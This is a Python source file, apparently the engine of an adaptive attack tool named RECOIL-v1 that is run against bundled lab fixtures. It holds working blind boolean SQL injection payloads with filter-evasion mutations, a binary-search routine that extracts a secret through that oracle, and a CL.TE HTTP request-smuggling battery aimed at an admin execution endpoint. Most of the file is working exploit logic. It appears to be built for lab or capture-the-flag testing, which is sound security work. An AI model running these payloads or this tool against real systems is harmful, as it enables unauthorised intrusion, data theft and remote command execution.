"""RECOIL-v1 engine core.

The fireback loop: every probe parses the response delta (status shift,
body-length delta, echo markers, timing) into a state vector, and the
mutation generator re-shapes the next probe from that vector - encoding,
obfuscation, framing - without ever touching the destination host
(scope.py owns destinations).

Families:
  sqli-b   blind-boolean SQLi oracle (response-length dependent), which a
           static "does it error?" scanner would miss.
  desync   CL.TE request-smuggling battery vs the bundled front/origin
           pair, with a patched control twin for FP measurement.
"""
from __future__ import annotations

import http.client
import socket
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Optional

from .evidence import Evidence
from . import fixtures


# ---------------------------------------------------------------------------
# state vector
# ---------------------------------------------------------------------------

@dataclass
class Probe:
    family: str
    shape: str          # the mutation variant id used
    status: int
    body: str
    ms: float
    len_delta: int = 0      # vs family baseline
    echo: str = ""          # marker leaked in body
    flags: dict[str, bool] = field(default_factory=dict)

    def state_vector(self) -> dict[str, Any]:
        return {
            "code": self.status,
            "len_delta": self.len_delta,
            "echo": self.echo,
            "ms": round(self.ms, 3),
            **self.flags,
        }


@dataclass
class ProbeResult:
    family: str
    shape: str
    code: int
    body: str
    ms: float
    len_delta: int = 0
    echo: str = ""
    flags: dict[str, bool] = field(default_factory=dict)

    def to_event(self) -> dict[str, Any]:
        return {
            "family": self.family,
            "shape": self.shape,
            "code": self.code,
            "len_delta": self.len_delta,
            "echo": self.echo,
            "ms": round(self.ms, 1),
            **self.flags,
        }


@dataclass
class FamilyState:
    family: str
    host: str
    port: int
    control_port: Optional[int] = None
    baseline_len: int = 0
    probe_count: int = 0
    budget: int = 40
    locked_encoding: str = ""
    reliability: float = 0.0
    history: list[ProbeResult] = field(default_factory=list)

    @property
    def spent(self) -> int:
        return self.probe_count


# ---------------------------------------------------------------------------
# sqli-b
# ---------------------------------------------------------------------------

SQLI_ENCODINGS = ["raw", "comment-stab", "case-shuffle", "ws-tab"]

# Balanced boolean predicates: the fixture's matcher needs the trailing quote.
SQLI_TRUE = "' AND '1'='1'"
SQLI_FALSE = "' AND '1'='2'"


def sqli_mutate(payload: str, enc: str) -> str:
    if enc == "comment-stab":
        return payload.replace("AND", "AND/**/")
    if enc == "case-shuffle":
        return payload.replace("AND", "AnD")
    if enc == "ws-tab":
        return payload.replace(" ", "\t")
    return payload


def probe_sqli(st: FamilyState, pred: str, enc: str) -> ProbeResult:
    value = sqli_mutate(pred, enc)
    q = urllib.parse.urlencode({"id": value})
    t0 = time.perf_counter()
    code, body = 0, ""
    try:
        conn = http.client.HTTPConnection(st.host, st.port, timeout=4)
        conn.request("GET", "/sqli?" + q)
        r = conn.getresponse()
        code = r.status
        body = r.read().decode("iso-8859-1", "replace")
        conn.close()
    except Exception as exc:
        code, body = -1, f"err:{type(exc).__name__}"
    ms = (time.perf_counter() - t0) * 1000
    res = ProbeResult("sqli-b", f"sqli:{enc}", code, body, ms)
    res.len_delta = len(body) - st.baseline_len
    st.history.append(res)
    st.probe_count += 1
    return res


def sqli_truth(res: ProbeResult) -> bool:
    """Strength-agnostic predicate truth from the response delta."""
    if res.code != 200:
        return False
    # oracle: TRUE bodies are strictly longer than FALSE bodies; the
    # residual small positive delta on FALSE frames (trailing newline)
    # is below the discriminative threshold.
    return res.len_delta >= ORACLE_THRESHOLD


ORACLE_THRESHOLD = 3


# ---------------------------------------------------------------------------
# desync
# ---------------------------------------------------------------------------

DESYNC_KINDS = ["chunked-plain", "chunked-ext", "cl-mismatch"]


def desync_body(kind: str, sm_path: str) -> tuple[bytes, str]:
    if kind == "chunked-ext":
        frame = "0;ext=1\r\n\r\n"
    else:
        frame = "0\r\n\r\n"
    smug = f"GET {sm_path} HTTP/1.1\r\nHost: {fixtures.HOST}\r\nX-Sm: v\r\n\r\n"
    return (frame + smug).encode("iso-8859-1"), f"desync:{kind}:{sm_path}"


def probe_desync(st: FamilyState, kind: str, sm_path: str) -> ProbeResult:
    body, shape = desync_body(kind, sm_path)
    raw = (
        f"POST /proxy/up HTTP/1.1\r\n"
        f"Host: {st.host}:{st.port}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Type: text/plain\r\n\r\n"
    ).encode("iso-8859-1") + body
    t0 = time.perf_counter()
    buf, code = b"", 0
    try:
        with socket.create_connection((st.host, st.port), timeout=4) as s:
            s.settimeout(4)
            s.sendall(raw)
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                buf += chunk
                if len(chunk) < 4096:
                    break
        head = buf.split(b"\r\n\r\n", 1)[0]
        try:
            code = int(head.split(b" ", 2)[1])
        except Exception:
            code = -1
    except Exception as exc:
        code, buf = -1, f"err:{type(exc).__name__}".encode()
    ms = (time.perf_counter() - t0) * 1000
    res = ProbeResult("desync", shape, code, buf.decode("iso-8859-1", "replace"), ms)
    res.len_delta = len(buf) - st.baseline_len
    res.echo = "admin-exec" if "admin-exec" in res.body else ""
    st.history.append(res)
    st.probe_count += 1
    return res


def desync_smuggled(res: ProbeResult) -> bool:
    txt = res.body
    return "origin id=ok" in txt or "admin-exec" in txt


def desync_rce(res: ProbeResult) -> bool:
    return "admin-exec" in res.body and "denied" not in res.body


# ---------------------------------------------------------------------------
# the feedback / mutation chooser
# ---------------------------------------------------------------------------

def pick_next(st: FamilyState) -> str:
    """Earned choice from the last probe's delta + per-shape history."""
    if st.locked_encoding:
        return st.locked_encoding
    if st.family == "sqli-b":
        encs = SQLI_ENCODINGS
    else:
        encs = DESYNC_KINDS
    for enc in encs:
        seen = any(p.shape.endswith(f":{enc}") or enc in p.shape for p in st.history)
        if not seen:
            return enc
    scored: dict[str, float] = {}
    for enc in encs:
        hits = [p for p in st.history if enc in p.shape]
        if not hits:
            continue
        hit = hits[-1]
        score = (
            abs(hit.len_delta) * 2
            + (4 if hit.code == 200 else 0)
            + (9 if hit.echo else 0)
            + (hit.ms if hit.family == "desync" else 0) / 100
        )
        scored[enc] = score
    return max(scored, key=scored.get) if scored else encs[0]


def epsilon_mutation(st: FamilyState, roll: int) -> str:
    """4-in-1 exploration keeps the loop from locking a local optimum."""
    if st.family == "sqli-b" and roll % 4 == 0:
        return SQLI_ENCODINGS[(roll // 4) % len(SQLI_ENCODINGS)]
    return pick_next(st)


# ---------------------------------------------------------------------------
# extraction: binary search over the blind boolean oracle
# ---------------------------------------------------------------------------

CHARSET = "".join(sorted(set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-! ")))

def extract_flag(st: FamilyState, enc: str, max_len: int = 48) -> str:
    out = ""
    for _pos in range(1, max_len + 1):
        pos = _pos
        lo, hi = 0, len(CHARSET) - 1
        while lo <= hi:
            mid = (lo + hi) // 2
            ch = CHARSET[mid]
            r = probe_sqli(st, f"' AND fsub({pos},{'>'}'{ch}')", enc)
            truth = sqli_truth(r)
            if truth:
                lo = mid + 1
            else:
                hi = mid - 1
        ch = CHARSET[lo] if 0 <= lo < len(CHARSET) else "?"
        out += ch
        if ch == "}" and len(out) >= 9:
            break
    return out


# ---------------------------------------------------------------------------
# fixture lab
# ---------------------------------------------------------------------------

class LabFixtures:
    def __enter__(self) -> "LabFixtures":
        self.web = fixtures.WebApp().start()
        self.admin = fixtures.AdminHost().start()
        self.origin_clte = fixtures.spawn_tcp(fixtures.origin_svc("clte", self.admin.port))
        self.origin_patched = fixtures.spawn_tcp(fixtures.patched_svc)
        self.front = fixtures.spawn_tcp(fixtures.front_svc(self.origin_clte.server_address[1]))
        self.web_port = self.web.port
        self.front_port = self.front.server_address[1]
        self.patched_port = self.origin_patched.server_address[1]
        self.admin_port = self.admin.port
        return self

    def __exit__(self, *a) -> None:
        try:
            self.web.stop()
        except Exception:
            pass
        for srv in (self.front, self.origin_clte, self.origin_patched):
            try:
                srv.shutdown()
            except Exception:
                pass
            try:
                srv.server_close()
            except Exception:
                pass
        try:
            self.admin.stop()
        except Exception:
            pass